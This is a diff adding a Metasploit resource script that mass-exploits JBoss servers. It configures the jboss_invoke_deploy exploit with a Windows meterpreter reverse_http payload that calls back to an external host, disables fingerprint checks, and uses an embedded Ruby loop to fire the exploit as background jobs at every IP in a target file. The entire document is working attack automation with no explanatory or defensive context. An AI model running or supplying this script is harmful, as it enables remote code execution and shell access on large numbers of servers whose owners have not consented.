@@ -1,0 +1,41 @@
+use exploit/multi/http/jboss_invoke_deploy
+set TARGET 2
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST ec2.ax.lt
+set DisablePayloadHandler true
+set FingerprintCheck false
+set LPORT 80
+set RPORT 80
+set SSL false
+
+<ruby>
+
+maxjobs = 25
+
+if (framework.datastore['VERBOSE'] == "true")
+  verbose = 1
+else
+  verbose = 0
+end
+
+if (framework.datastore['THREADS'] == nil)
+  run_single("setg THREADS 25")
+end
+
+def jobwaiting(maxjobs,verbose) #thread handling for poor guys
+  while(framework.jobs.keys.length >= maxjobs)
+    ::IO.select(nil, nil, nil, 2.5)
+    if(verbose == 1)
+      print_error("waiting for finishing some modules... active jobs: #{framework.jobs.keys.length} / threads: #{framework.threads.length}")
+    end
+  end
+end
+
+ips = File.open("/pentest/targets/80", "r")
+
+ips.each do |ip|
+  jobwaiting(maxjobs,verbose)
+  run_single("set RHOST #{ip}")
+  run_single("exploit -j -z")
+end
+</ruby>
